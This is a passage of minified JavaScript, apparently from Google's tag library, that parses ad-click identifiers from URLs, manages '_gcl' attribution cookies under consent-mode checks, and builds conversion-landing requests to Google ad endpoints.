    },
    ho = function (a, b) {
      Pn();
      Qn(a, [En(z.location, "host", !0)], b, !0, !0);
    },
    io = function () {
      var a = E.location.hostname,
        b = Tn.exec(E.referrer);
      if (!b) return !1;
      var c = b[2],
        d = b[1],
        e = "";
      if (c) {
        var f = c.split("/"),
          g = f[1];
        e = "s" === g ? decodeURIComponent(f[2]) : decodeURIComponent(g);
      } else if (d) {
        if (0 === d.indexOf("xn--")) return !1;
        e = d.replace(/-/g, ".").replace(/\.\./g, "-");
      }
      var k = a.replace(Un, ""),
        m = e.replace(Un, ""),
        n;
      if (!(n = k === m)) {
        var p = "." + m;
        n = k.substring(k.length - p.length, k.length) === p;
      }
      return n;
    },
    jo = function (a, b) {
      return !1 === a ? !1 : a || b || io();
    };
  var ko = ["1"],
    lo = {},
    mo = {},
    ro = function (a, b) {
      b = void 0 === b ? !0 : b;
      var c = no(a.prefix);
      if (!lo[c]) if (oo(c, a.path, a.domain)) {
        var d = mo[no(a.prefix)];
        po(a, d ? d.id : void 0, d ? d.zh : void 0);
      } else {
        var e = Jn("auiddc");
        if (e) Ab("TAGGING", 17), lo[c] = e;else if (b) {
          var f = no(a.prefix),
            g = Rm();
          if (0 === qo(f, g, a)) {
            var k = Fc("google_tag_data", {});
            k._gcl_au || (k._gcl_au = g);
          }
          oo(c, a.path, a.domain);
        }
      }
    };
  function po(a, b, c) {
    var d = no(a.prefix),
      e = lo[d];
    if (e) {
      var f = e.split(".");
      if (2 === f.length) {
        var g = Number(f[1]) || 0;
        if (g) {
          var k = e;
          b && (k = e + "." + b + "." + (c ? c : Math.floor(Ua() / 1E3)));
          qo(d, k, a, 1E3 * g);
        }
      }
    }
  }
  function qo(a, b, c, d) {
    var e = Vm(b, "1", c.domain, c.path),
      f = Kn(c, d);
    f.Fb = so();
    return Nm(a, e, f);
  }
  function oo(a, b, c) {
    var d = Um(a, b, c, ko, so());
    if (!d) return !1;
    to(a, d);
    return !0;
  }
  function to(a, b) {
    var c = b.split(".");
    5 === c.length ? (lo[a] = c.slice(0, 2).join("."), mo[a] = {
      id: c.slice(2, 4).join("."),
      zh: Number(c[4]) || 0
    }) : 3 === c.length ? mo[a] = {
      id: c.slice(0, 2).join("."),
      zh: Number(c[2]) || 0
    } : lo[a] = b;
  }
  function no(a) {
    return (a || "_gcl") + "_au";
  }
  function uo(a) {
    function b() {
      Ij(c) && a();
    }
    var c = so();
    Qj(function () {
      b();
      Ij(c) || Rj(b, c);
    }, c);
  }
  function vo(a) {
    var b = Zn(!0),
      c = no(a.prefix);
    uo(function () {
      var d = b[c];
      if (d) {
        to(c, d);
        var e = 1E3 * Number(lo[c].split(".")[1]);
        if (e) {
          Ab("TAGGING", 16);
          var f = Kn(a, e);
          f.Fb = so();
          var g = Vm(d, "1", a.domain, a.path);
          Nm(c, g, f);
        }
      }
    });
  }
  function wo(a, b, c, d, e) {
    e = e || {};
    var f = function () {
      var g = {},
        k = Um(a, e.path, e.domain, ko, so());
      k && (g[a] = k);
      return g;
    };
    uo(function () {
      go(f, b, c, d);
    });
  }
  function so() {
    return Sf(14) ? ["ad_storage", "ad_user_data"] : ["ad_storage"];
  }
  ;
  var xo = function (a) {
    for (var b = [], c = E.cookie.split(";"), d = new RegExp("^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$"), e = 0; e < c.length; e++) {
      var f = c[e].match(d);
      f && b.push({
        Ph: f[1],
        value: f[2],
        timestamp: Number(f[2].split(".")[1]) || 0
      });
    }
    b.sort(function (g, k) {
      return k.timestamp - g.timestamp;
    });
    return b;
  };
  function yo(a, b) {
    var c = xo(a),
      d = {};
    if (!c || !c.length) return d;
    for (var e = 0; e < c.length; e++) {
      var f = c[e].value.split(".");
      if (!("1" !== f[0] || b && 3 > f.length || !b && 3 !== f.length) && Number(f[1])) {
        d[c[e].Ph] || (d[c[e].Ph] = []);
        var g = {
          version: f[0],
          timestamp: 1E3 * Number(f[1]),
          aa: f[2]
        };
        b && 3 < f.length && (g.labels = f.slice(3));
        d[c[e].Ph].push(g);
      }
    }
    return d;
  }
  ;
  var zo = /^\w+$/,
    Ao = /^[\w-]+$/,
    Bo = {
      aw: "_aw",
      dc: "_dc",
      gf: "_gf",
      ha: "_ha",
      gp: "_gp",
      gb: "_gb"
    };
  function Co() {
    return Sf(14) ? ["ad_storage", "ad_user_data"] : ["ad_storage"];
  }
  var Do = function () {
      return vj().h() ? Ij(Co()) : !0;
    },
    Eo = function (a) {
      function b() {
        var c = Do();
        c && a();
        return c;
      }
      Qj(function () {
        b() || Rj(b, Co());
      }, Co());
    },
    Go = function (a) {
      return Fo(a).map(function (b) {
        return b.aa;
      });
    },
    Fo = function (a) {
      var b = [];
      if (!Bm(z) || !E.cookie) return b;
      var c = Em(a, E.cookie, void 0, Co());
      if (!c || 0 == c.length) return b;
      for (var d = {}, e = 0; e < c.length; d = {
        aa: d.aa
      }, e++) {
        var f = Ho(c[e]);
        if (null != f) {
          var g = f,
            k = g.version;
          d.aa = g.aa;
          var m = g.timestamp,
            n = g.labels,
            p = Ja(b, function (q) {
              return function (r) {
                return r.aa === q.aa;
              };
            }(d));
          p ? (p.timestamp = Math.max(p.timestamp, m), p.labels = Io(p.labels, n || [])) : b.push({
            version: k,
            aa: d.aa,
            timestamp: m,
            labels: n
          });
        }
      }
      b.sort(function (q, r) {
        return r.timestamp - q.timestamp;
      });
      return Jo(b);
    };
  function Io(a, b) {
    for (var c = {}, d = [], e = 0; e < a.length; e++) c[a[e]] = !0, d.push(a[e]);
    for (var f = 0; f < b.length; f++) c[b[f]] || d.push(b[f]);
    return d;
  }
  function Ko(a) {
    return a && "string" == typeof a && a.match(zo) ? a : "_gcl";
  }
  var Mo = function () {
      var a = Hn(z.location.href),
        b = Fn(a, "query", !1, void 0, "gclid"),
        c = Fn(a, "query", !1, void 0, "gclsrc"),
        d = Fn(a, "query", !1, void 0, "wbraid"),
        e = Fn(a, "query", !1, void 0, "dclid");
      if (!b || !c || !d) {
        var f = a.hash.replace("#", "");
        b = b || Cn(f, "gclid", !1);
        c = c || Cn(f, "gclsrc", !1);
        d = d || Cn(f, "wbraid", !1);
      }
      return Lo(b, c, e, d);
    },
    Lo = function (a, b, c, d) {
      var e = {},
        f = function (g, k) {
          e[k] || (e[k] = []);
          e[k].push(g);
        };
      e.gclid = a;
      e.gclsrc = b;
      e.dclid = c;
      void 0 !== d && Ao.test(d) && (e.gbraid = d, f(d, "gb"));
      if (void 0 !== a && a.match(Ao)) switch (b) {
        case void 0:
          f(a, "aw");
          break;
        case "aw.ds":
          f(a, "aw");
          f(a, "dc");
          break;
        case "ds":
          f(a, "dc");
          break;
        case "3p.ds":
          f(a, "dc");
          break;
        case "gf":
          f(a, "gf");
          break;
        case "ha":
          f(a, "ha");
      }
      c && f(c, "dc");
      return e;
    },
    Oo = function (a) {
      var b = Mo();
      Eo(function () {
        No(b, !1, a);
      });
    };
  function No(a, b, c, d, e) {
    function f(w, x) {
      var y = Po(w, g);
      y && (Nm(y, x, k), m = !0);
    }
    c = c || {};
    e = e || [];
    var g = Ko(c.prefix);
    d = d || Ua();
    var k = Kn(c, d, !0);
    k.Fb = Co();
    var m = !1,
      n = Math.round(d / 1E3),
      p = function (w) {
        var x = ["GCL", n, w];
        0 < e.length && x.push(e.join("."));
        return x.join(".");
      };
    a.aw && f("aw", p(a.aw[0]));
    a.dc && f("dc", p(a.dc[0]));
    a.gf && f("gf", p(a.gf[0]));
    a.ha && f("ha", p(a.ha[0]));
    a.gp && f("gp", p(a.gp[0]));
    if (!m && a.gb) {
      var q = a.gb[0],
        r = Po("gb", g),
        t = !1;
      if (!b) for (var u = Fo(r), v = 0; v < u.length; v++) u[v].aa === q && u[v].labels && 0 < u[v].labels.length && (t = !0);
      t || f("gb", p(q));
    }
  }
  var Ro = function (a, b) {
      var c = Zn(!0);
      Eo(function () {
        for (var d = Ko(b.prefix), e = 0; e < a.length; ++e) {
          var f = a[e];
          if (void 0 !== Bo[f]) {
            var g = Po(f, d),
              k = c[g];
            if (k) {
              var m = Math.min(Qo(k), Ua()),
                n;
              b: {
                var p = m;
                if (Bm(z)) for (var q = Em(g, E.cookie, void 0, Co()), r = 0; r < q.length; ++r) if (Qo(q[r]) > p) {
                  n = !0;
                  break b;
                }
                n = !1;
              }
              if (!n) {
                var t = Kn(b, m, !0);
                t.Fb = Co();
                Nm(g, k, t);
              }
            }
          }
        }
        No(Lo(c.gclid, c.gclsrc), !1, b);
      });
    },
    Po = function (a, b) {
      var c = Bo[a];
      if (void 0 !== c) return b + c;
    },
    Qo = function (a) {
      return 0 !== So(a.split(".")).length ? 1E3 * (Number(a.split(".")[1]) || 0) : 0;
    };
  function Ho(a) {
    var b = So(a.split("."));
    return 0 === b.length ? null : {
      version: b[0],
      aa: b[2],
      timestamp: 1E3 * (Number(b[1]) || 0),
      labels: b.slice(3)
    };
  }
  function So(a) {
    return 3 > a.length || "GCL" !== a[0] && "1" !== a[0] || !/^\d+$/.test(a[1]) || !Ao.test(a[2]) ? [] : a;
  }
  var To = function (a, b, c, d, e) {
      if (Ha(b) && Bm(z)) {
        var f = Ko(e),
          g = function () {
            for (var k = {}, m = 0; m < a.length; ++m) {
              var n = Po(a[m], f);
              if (n) {
                var p = Em(n, E.cookie, void 0, Co());
                p.length && (k[n] = p.sort()[p.length - 1]);
              }
            }
            return k;
          };
        Eo(function () {
          go(g, b, c, d);
        });
      }
    },
    Jo = function (a) {
      return a.filter(function (b) {
        return Ao.test(b.aa);
      });
    },
    Uo = function (a, b) {
      if (Bm(z)) {
        for (var c = Ko(b.prefix), d = {}, e = 0; e < a.length; e++) Bo[a[e]] && (d[a[e]] = Bo[a[e]]);
        Eo(function () {
          l(d, function (f, g) {
            var k = Em(c + g, E.cookie, void 0, Co());
            k.sort(function (t, u) {
              return Qo(u) - Qo(t);
            });
            if (k.length) {
              var m = k[0],
                n = Qo(m),
                p = 0 !== So(m.split(".")).length ? m.split(".").slice(3) : [],
                q = {},
                r;
              r = 0 !== So(m.split(".")).length ? m.split(".")[2] : void 0;
              q[f] = [r];
              No(q, !0, b, n, p);
            }
          });
        });
      }
    };
  function Vo(a, b) {
    for (var c = 0; c < b.length; ++c) if (a[b[c]]) return !0;
    return !1;
  }
  var Wo = function (a) {
      function b(e, f, g) {
        g && (e[f] = g);
      }
      if (Mj()) {
        var c = Mo();
        if (Vo(c, a)) {
          var d = {};
          b(d, "gclid", c.gclid);
          b(d, "dclid", c.dclid);
          b(d, "gclsrc", c.gclsrc);
          b(d, "wbraid", c.gbraid);
          ho(function () {
            return d;
          }, 3);
          ho(function () {
            var e = {};
            return e._up = "1", e;
          }, 1);
        }
      }
    },
    Xo = function (a) {
      if (!Sf(11)) return null;
      var b = Zn(!0).gad_source;
      if (null != b) return z.location.hash = "", b;
      if (Sf(12)) {
        var c = Hn(z.location.href);
        b = Fn(c, "query", !1, void 0, "gad_source");
        if (null != b) return b;
        var d = Mo();
        if (Vo(d, a)) return "0";
      }
      return null;
    },
    Yo = function (a) {
      var b = Xo(a);
      null != b && ho(function () {
        var c = {};
        return c.gad_source = b, c;
      }, 4);
    },
    Zo = function (a, b, c, d) {
      var e = [];
      c = c || {};
      if (!Do()) return e;
      var f = Fo(a);
      if (!f.length) return e;
      for (var g = 0; g < f.length; g++) -1 === (f[g].labels || []).indexOf(b) ? e.push(0) : e.push(1);
      if (d) return e;
      if (1 !== e[0]) {
        var k = f[0],
          m = f[0].timestamp,
          n = [k.version, Math.round(m / 1E3), k.aa].concat(k.labels || [], [b]).join("."),
          p = Kn(c, m, !0);
        p.Fb = Co();
        Nm(a, n, p);
      }
      return e;
    };
  function $o(a, b) {
    var c = Ko(b),
      d = Po(a, c);
    if (!d) return 0;
    for (var e = Fo(d), f = 0, g = 0; g < e.length; g++) f = Math.max(f, e[g].timestamp);
    return f;
  }
  function ap(a) {
    var b = 0,
      c;
    for (c in a) for (var d = a[c], e = 0; e < d.length; e++) b = Math.max(b, Number(d[e].timestamp));
    return b;
  }
  var bp = function (a) {
    var b = Math.max($o("aw", a), ap(Do() ? yo() : {}));
    return Math.max($o("gb", a), ap(Do() ? yo("_gac_gb", !0) : {})) > b;
  };
  var dp = function (a, b) {
      var c = a && !ak(cp());
      return b && c ? "0" : b;
    },
    gp = function (a) {
      var b = function () {
        function c(y) {
          var A = ak(cp()),
            C = m && A,
            D;
          oi.reported_gclid || (oi.reported_gclid = {});
          D = oi.reported_gclid;
          var F = function () {
            var fa = k.prefix || "_gcl";
            return S(61) ? (C ? fa : "") + "." + (ak(Q.g.K) ? 1 : 0) + "." + (ak(Q.g.O) ? 1 : 0) : m && ak(Q.g.K) ? p + "." + fa + (y ? "gcu" : "gcs") : p + (y ? "gcu" : "gcs");
          }();
          if (!D[F]) {
            D[F] = !0;
            var H = [],
              G = {},
              I = function (fa, ca) {
                ca && (H.push(fa + "=" + encodeURIComponent(ca)), G[fa] = !0);
              },
              P = "https://www.google.com";
            pm() && (I("gcs", qm()), y && I("gcu", "1"));
            (S(37) || Nj()) && I("gcd", um(g));
            if (Mj()) {
              I("rnd", Wm());
              if ((!p || q && "aw.ds" !== q) && A) {
                var U = Go("_gcl_aw");
                I("gclaw", U.join("."));
              }
              I("url", String(z.location).split(/[?#]/)[0]);
              I("dclid", dp(e, r));
              A || (P = "https://pagead2.googlesyndication.com");
            }
            S(39) && (ym() && I("dma_cps", vm()), I("dma", xm()));
            S(106) && (om(g) ? S(41) && I("npa", "0") : I("npa", "1"));
            S(62) && Ql(Zl()) && I("tcfd", zm());
            I("gdpr_consent", gm() || "");
            I("gdpr", hm() || "");
            "1" === Zn(!1)._up && I("gtm_up", "1");
            I("gclid", dp(e, p));
            I("gclsrc", q);
            if (!(G.gclid || G.dclid || G.gclaw) && (I("gbraid", dp(e, t)), !G.gbraid && Mj() && ak(Q.g.K))) {
              var ia = Go("_gcl_gb");
              0 < ia.length && I("gclgb", ia.join("."));
            }
            I("gtm", hn(g.eventMetadata.source_canonical_id, !f));
            m && ak(Q.g.K) && (ro(k || {}), C && I("auid", lo[no(k.prefix)] || ""));
            fp || a.sj && I("did", a.sj);
            a.oh && I("gdid", a.oh);
            a.kh && I("edid", a.kh);
            var X = S(21) ? rn() : null;
            if (X) {
              var T = function (fa, ca) {
                H.push(fa + "=" + encodeURIComponent(ca));
                G[fa] = !0;
              };
              T("uaa", X.architecture);
              T("uab", X.bitness);
              X.fullVersionList && T("uafvl", X.fullVersionList.map(function (fa) {
                return encodeURIComponent(fa.brand || "") + ";" + encodeURIComponent(fa.version || "");
              }).join("|"));
              T("uam", X.model);
              T("uap", X.platform);
              T("uapv", X.platformVersion);
              T("uaw", X.wow64 ? "1" : "0");
            }
            var ma = P + "/pagead/landing?" + H.join("&");
            Uc(ma);
          }
        }
        var d = !!a.fh,
          e = !!a.Uf,
          f = a.targetId,
          g = a.s,
          k = void 0 === a.gd ? {} : a.gd,
          m = void 0 === a.Nf ? !0 : a.Nf,
          n = Mo(),
          p = n.gclid || "",
          q = n.gclsrc,
          r = n.dclid || "",
          t = n.gbraid || "",
          u = !d && ((!p || q && "aw.ds" !== q ? !1 : !0) || t),
          v = Mj();
        if (u || v) if (v) {
          var w = S(61) ? [Q.g.K, Q.g.O, Q.g.Ea] : [Q.g.K],
            x = function () {
              ak(w) || ck(function (y) {
                return c(!0, y.consentEventId, y.consentPriorityId);
              }, w);
            };
          S(62) ? (c(), x()) : dk(function () {
            c();
            x();
          }, w);
        } else c();
      };
      S(62) ? dk(b, [Q.g.K, Q.g.O, Q.g.Ea]) : b();
    },
    cp = function () {
      return S(61) ? [Q.g.K, Q.g.O] : [Q.g.K];
    },
    ep = function (a) {
      var b = String(z.location).split(/[?#]/)[0],
        c = ni.fk || z._CONSENT_MODE_SALT;
      return a ? c ? String($i(b + a + c)) : "0" : "";
    },
    fp = !1;
  var hp = /[A-Z]+/,
    ip = /\s/,
    jp = function (a, b) {
      if (h(a)) {
        a = Sa(a);
        var c = a.indexOf("-");
        if (!(0 > c)) {
          var d = a.substring(0, c);
          if (hp.test(d)) {
            var e = a.substring(c + 1),
              f;
            if (b) {
              var g = function (n) {
                var p = n.indexOf("/");
                return 0 > p ? [n] : [n.substring(0, p), n.substring(p + 1)];
              };
              f = g(e);
              if ("DC" === d && 2 === f.length) {
                var k = g(f[1]);
                2 === k.length && (f[1] = k[0], f.push(k[1]));
              }
            } else {
              f = e.split("/");
              for (var m = 0; m < f.length; m++) if (!f[m] || ip.test(f[m]) && ("AW" !== d || 1 !== m)) return;
            }
            return {
              id: a,
              prefix: d,
              fa: d + "-" + f[0],
              R: f
            };
          }
        }
      }
    },
    lp = function (a, b) {
      for (var c = {}, d = 0; d < a.length; ++d) {
        var e = jp(a[d], b);
        e && (c[e.id] = e);
      }
      kp(c);
      var f = [];
      l(c, function (g, k) {
        f.push(k);
      });
      return f;
    };
  function kp(a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      "AW" === d.prefix && d.R[1] && b.push(d.fa);
    }
    for (var e = 0; e < b.length; ++e) delete a[b[e]];
  }
  ;
  var mp = function (a, b, c, d) {
    var e = Lc(),
      f;
    if (1 === e) a: {
      var g = Ci;
      g = g.toLowerCase();
      for (var k = "https://" + g, m = "http://" + g, n = 1, p = E.getElementsByTagName("script"), q = 0; q < p.length && 100 > q; q++) {
        var r = p[q].src;
        if (r) {
          r = r.toLowerCase();
          if (0 === r.indexOf(m)) {
            f = 3;
            break a;
          }
          1 === n && 0 === r.indexOf(k) && (n = 2);
        }
      }
      f = n;
    } else f = e;
    return (2 === f || d || "http:" != z.location.protocol ? a : b) + c;
  };
  var yp,
    zp = !1;
  function Ap() {
    zp = !0;
    yp = yp || {};
  }
  var Bp = function (a) {
    zp || Ap();
    return yp[a];
  };
  var Cp = function (a, b, c) {
    this.target = a;
    this.eventName = b;
    this.s = c;
    this.h = {};
    this.metadata = B(c.eventMetadata || {});
    this.isAborted = !1;
  };
  Cp.prototype.copyToHitData = function (a, b, c) {
    var d = V(this.s, a);
    void 0 === d && (d = b);
    if (void 0 !== d && void 0 !== c && h(d) && S(68)) try {
      d = c(d);
    } catch (e) {}
    void 0 !== d && (this.h[a] = d);
  };
  var Dp = function (a) {
      return a.metadata.source_canonical_id;
    },
    Ep = function (a, b, c) {
      var d = Bp(a.target.fa);
      return d && d.hasOwnProperty(b) ? d[b] : c;
    };
  function Fp(a) {
    return {
      getDestinationId: function () {
        return a.target.fa;
      },
      getEventName: function () {
        return a.eventName;
      },
      setEventName: function (b) {
        a.eventName = b;
      },
      getHitData: function (b) {
        return a.h[b];
      },
      setHitData: function (b, c) {
        a.h[b] = c;
      },
      setHitDataIfNotDefined: function (b, c) {
        void 0 === a.h[b] && (a.h[b] = c);
      },
      copyToHitData: function (b, c) {
        a.copyToHitData(b, c);
      },
      getMetadata: function (b) {
        return a.metadata[b];
      },
      setMetadata: function (b, c) {
        a.metadata[b] = c;
      },
      isAborted: function () {
        return a.isAborted;
      },
      abort: function () {
        a.isAborted = !0;
      },
      getFromEventContext: function (b) {
        return V(a.s, b);
      },
      wj: function () {
        return a;
      },
      getHitKeys: function () {
        return Object.keys(a.h);
      }
    };
  }
  ;
  var Hp = function (a) {
      var b = Gp[a.target.fa];
      if (!a.isAborted && b) for (var c = Fp(a), d = 0; d < b.length; ++d) {
        try {
          b[d](c);
        } catch (e) {
          a.isAborted = !0;
        }
        if (a.isAborted) break;
      }
    },
    Ip = function (a, b) {
      var c = Gp[a];
      c || (c = Gp[a] = []);
      c.push(b);
    },
    Gp = {};
  function Mp(a, b) {
    if (a) {
      var c = "" + a;
      0 !== c.indexOf("http://") && 0 !== c.indexOf("https://") && (c = "https://" + c);
      "/" === c[c.length - 1] && (c = c.substring(0, c.length - 1));
      return Hn("" + c + b).href;
    }
  }
  function Np() {
    return !!ni.zf && "SGTM_TOKEN" !== ni.zf.split("@@").join("");
  }
  function Op(a) {
    for (var b = ha([Q.g.Ud, Q.g.Qb]), c = b.next(); !c.done; c = b.next()) {
      var d = V(a, c.value);
      if (d) return d;
    }
  }
  ;
  var Pp = "",
    Qp = [];
  function Rp(a) {
    var b = "";
    Pp && (b = "&dl=" + encodeURIComponent(Pp));
    0 < Qp.length && (b += "&tdp=" + Qp.join("."));
    a.hc && (Pp = "", Qp.length = 0, b && a.Oj());
    return b;
  }
  ;
  var Sp = [];
  function Tp(a) {
    if (!Sp.length) return "";
    var b = "&tdc=" + Sp.join("!");
    a.hc && (a.Oj(), Sp.length = 0);
    return b;
  }
  ;
  var Up = {
      initialized: 11,
      complete: 12,
      interactive: 13
    },
    Vp = {},
    Wp = Object.freeze((Vp[Q.g.Ra] = !0, Vp)),
    Xp = 0 <= E.location.search.indexOf("?gtm_diagnostics=") || 0 <= E.location.search.indexOf("&gtm_diagnostics="),
    Zp = function (a, b, c) {
      if (Ok && "config" === a && !(1 < jp(b).R.length)) {
        var d,
          e = Fc("google_tag_data", {});
        e.td || (e.td = {});
        d = e.td;
        var f = B(c.H);
        B(c.h, f);
        var g = [],
          k;
        for (k in d) {
          var m = Yp(d[k], f);
          m.length && (Xp && console.log(m), g.push(k));
        }
        g.length && (g.length && Ok && Sp.push(b + "*" + g.join(".")), Ab("TAGGING", Up[E.readyState] || 14));
        d[b] = f;
      }
    };
  function $p(a, b) {
    var c = {},
      d;
    for (d in b) b.hasOwnProperty(d) && (c[d] = !0);
    for (var e in a) a.hasOwnProperty(e) && (c[e] = !0);
    return c;
  }
  function Yp(a, b, c, d) {
    c = void 0 === c ? {} : c;
    d = void 0 === d ? "" : d;
    if (a === b) return [];
    var e = function (q, r) {
        var t = r[q];
        return void 0 === t ? Wp[q] : t;
      },
      f;
    for (f in $p(a, b)) {
      var g = (d ? d + "." : "") + f,
        k = e(f, a),
        m = e(f, b),
        n = "object" === lb(k) || "array" === lb(k),
        p = "object" === lb(m) || "array" === lb(m);
      if (n && p) Yp(k, m, c, g);else if (n || p || k !== m) c[g] = !0;
    }
    return Object.keys(c);
  }
  ;
  var aq = {};
  function bq(a, b, c) {
    Ok && void 0 !== a && (aq[a] = aq[a] || [], aq[a].push(c + b), Yk(a));
  }
  function cq(a) {
    var b = a.eventId,
      c = a.hc,
      d = "",
      e = aq[b] || [];
    e.length && (d += "&epr=" + e.join("."));
    c && delete aq[b];
    return d;
  }
  ;
  var eq = function (a, b) {
      var c = jp(sk(a), !0);
      c && dq.register(c, b);
    },
    fq = function (a, b, c, d) {
      var e = jp(c, d.isGtmEvent);
      e && dq.push("event", [b, a], e, d);
    },
    gq = function (a, b, c, d) {
      var e = jp(c, d.isGtmEvent);
      e && dq.push("get", [a, b], e, d);
    },
    iq = function (a) {
      var b = jp(sk(a), !0),
        c;
      b ? c = hq(dq, b).h : c = {};
      return c;
    },
    jq = function (a, b) {
      var c = jp(sk(a), !0);
      if (c) {
        var d = dq,
          e = B(b);
        B(hq(d, c).h, e);
        hq(d, c).h = e;
      }
    },
    kq = function () {
      this.status = 1;
      this.N = {};
      this.h = {};
      this.C = {};
      this.T = null;
      this.H = {};
      this.D = !1;
    },
    lq = function (a, b, c, d) {
      var e = Ua();
      this.type = a;
      this.D = e;
      this.h = b;
      this.C = c;
      this.messageContext = d;
    },
    mq = function () {
      this.C = {};
      this.D = {};
      this.h = [];
    },
    hq = function (a, b) {
      var c = b.fa;
      return a.C[c] = a.C[c] || new kq();
    },
    nq = function (a, b, c, d) {
      if (d.h) {
        var e = hq(a, d.h),
          f = e.T;
        if (f) {
          var g = B(c),
            k = B(e.N[d.h.id]),
            m = B(e.H),
            n = B(e.h),
            p = B(a.D),
            q = {};
          if (Ok) try {
            q = B(Li);
          } catch (v) {
            O(72);
          }
          var r = d.h.prefix,
            t = function (v) {
              bq(d.messageContext.eventId, r, v);
            },
            u = rl(ql(pl(ol(nl(ll(kl(ml(jl(il(hl(new gl(d.messageContext.eventId, d.messageContext.priorityId), g), k), m), n), p), q), d.messageContext.eventMetadata), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("2");
                if (d.messageContext.onSuccess) d.messageContext.onSuccess();
              }
            }), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("3");
                if (d.messageContext.onFailure) d.messageContext.onFailure();
              }
            }), !!d.messageContext.isGtmEvent));
          try {
            bq(d.messageContext.eventId, r, "1"), Zp(d.type, d.h.id, u), f(d.h.id, b, d.D, u);
          } catch (v) {
            bq(d.messageContext.eventId, r, "4");
          }
        }
      }
    };
  mq.prototype.register = function (a, b, c) {
    var d = hq(this, a);
    3 !== d.status && (d.T = b, d.status = 3, c && (B(d.h, c), d.h = c), this.flush());
  };
  mq.prototype.push = function (a, b, c, d) {
    void 0 !== c && (1 === hq(this, c).status && (hq(this, c).status = 2, this.push("require", [{}], c, {})), hq(this, c).D && (d.deferrable = !1));
    this.h.push(new lq(a, c, b, d));
    d.deferrable || this.flush();
  };
  mq.prototype.flush = function (a) {
    for (var b = this, c = [], d = !1, e = {}; this.h.length;) {
      e = {
        Xb: e.Xb,
        Hf: e.Hf
      };
      var f = this.h[0],
        g = f.h;
      if (f.messageContext.deferrable) !g || hq(this, g).D ? (f.messageContext.deferrable = !1, this.h.push(f)) : c.push(f), this.h.shift();else {
        switch (f.type) {
          case "require":
            if (3 !== hq(this, g).status && !a) {
              this.h.push.apply(this.h, c);
              return;
            }
            break;
          case "set":
            l(f.C[0], function (r, t) {
              B(ab(r, t), b.D);
            });
            break;
          case "config":
            var k = hq(this, g);
            e.Xb = {};
            l(f.C[0], function (r) {
              return function (t, u) {
                B(ab(t, u), r.Xb);
              };
            }(e));
            var m = !!e.Xb[Q.g.Rb];
            delete e.Xb[Q.g.Rb];
            var n = g.fa === g.id;
            m || (n ? k.H = {} : k.N[g.id] = {});
            k.D && m || nq(this, Q.g.sa, e.Xb, f);
            k.D = !0;
            n ? B(e.Xb, k.H) : (B(e.Xb, k.N[g.id]), O(70));
            d = !0;
            break;
          case "event":
            e.Hf = {};
            l(f.C[0], function (r) {
              return function (t, u) {
                B(ab(t, u), r.Hf);
              };
            }(e));
            nq(this, f.C[1], e.Hf, f);
            break;
          case "get":
            var p = {},
              q = (p[Q.g.ib] = f.C[0], p[Q.g.vb] = f.C[1], p);
            nq(this, Q.g.Oa, q, f);
        }
        this.h.shift();
        oq(this, f);
      }
    }
    this.h.push.apply(this.h, c);
    d && this.flush();
  };
  var oq = function (a, b) {
      if ("require" !== b.type) if (b.h) for (var c = hq(a, b.h).C[b.type] || [], d = 0; d < c.length; d++) c[d]();else for (var e in a.C) if (a.C.hasOwnProperty(e)) {
        var f = a.C[e];
        if (f && f.C) for (var g = f.C[b.type] || [], k = 0; k < g.length; k++) g[k]();
      }
    },
    dq = new mq();
  var pq = function (a, b, c) {
      var d = oi.joined_auid = oi.joined_auid || {},
        e = (c ? a || "_gcl" : "") + "." + b;
      if (d[e]) return !0;
      d[e] = !0;
      return !1;
    },
    qq = function () {
      var a = Hn(z.location.href),
        b = Fn(a, "query", !1, void 0, "gad_source");
      if (void 0 === b) {
        var c = a.hash.replace("#", "");
        b = Cn(c, "gad_source", !1);
      }
      return b;
    },
    rq = function () {
      var a = Hn(z.location.href).search.replace("?", "");
      return "1" === Cn(a, "gad", !1, !0);
    },
    sq = function (a) {
      var b = [];
      l(a, function (c, d) {
        d = Jo(d);
        for (var e = [], f = 0; f < d.length; f++) e.push(d[f].aa);
        e.length && b.push(c + ":" + e.join(","));
      });
      return b.join(";");
    },
    uq = function (a, b, c) {
      if ("aw" === a || "dc" === a || "gb" === a) {
        var d = Jn("gcl" + a);
        if (d) return d.split(".");
      }
      var e = Ko(b);
      if ("_gcl" == e) {
        c = void 0 === c ? !0 : c;
        var f = !ak(tq()) && c,
          g;
        g = Mo()[a] || [];
        if (0 < g.length) return f ? ["0"] : g;
      }
      var k = Po(a, e);
      return k ? Go(k) : [];
    },
    vq = function (a) {
      var b = tq();
      dk(function () {
        a();
        ak(b) || Rj(a, b);
      }, b);
    },
    tq = function () {
      return S(61) ? [Q.g.K, Q.g.O] : [Q.g.K];
    },
    wq = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
    xq = /^www.googleadservices.com$/,
    yq = function (a, b) {
      return uq("aw", a, b);
    },
    zq = function (a, b) {
      return uq("dc", a, b);
    },
    Aq = function (a) {
      var b = Jn("gac");
      return b ? !ak(tq()) && a ? "0" : decodeURIComponent(b) : sq(Do() ? yo() : {});
    },
    Bq = function (a) {
      var b = Jn("gacgb");
      return b ? !ak(tq()) && a ? "0" : decodeURIComponent(b) : sq(Do() ? yo("_gac_gb", !0) : {});
    },
    Cq = function (a, b, c) {
      var d = Mo(),
        e = [],
        f = d.gclid,
        g = d.dclid,
        k = d.gclsrc || "aw",
        m = rq(),
        n = qq();
      !f || "aw.ds" !== k && "aw" !== k && "ds" !== k || e.push({
        aa: f,
        Ce: k
      });
      g && e.push({
        aa: g,
        Ce: "ds"
      });
      0 === e.length && d.gbraid && e.push({
        aa: d.gbraid,
        Ce: "gb"
      });
      S(27) && 0 === e.length && "aw.ds" === k && e.push({
        aa: "",
        Ce: "aw.ds"
      });
      vq(function () {
        if (S(61) && S(66) || ak(Q.g.K)) {
          var p = ak(tq());
          ro(a);
          var q;
          if (p && (q = lo[no(a.prefix)], void 0 === q && !S(61))) return;
          var r = [];
          q && r.push("auid=" + q);
          if (S(9)) {
            var t = E.referrer ? Fn(Hn(E.referrer), "host") : "";
            0 === e.length && (wq.test(t) || xq.test(t)) && e.push({
              aa: "",
              Ce: ""
            });
            if (0 === e.length && !m && void 0 === n) return;
            t && r.push("ref=" + encodeURIComponent(t));
            var u = 1 === Il(!0) ? z.top.location.href : z.location.href;
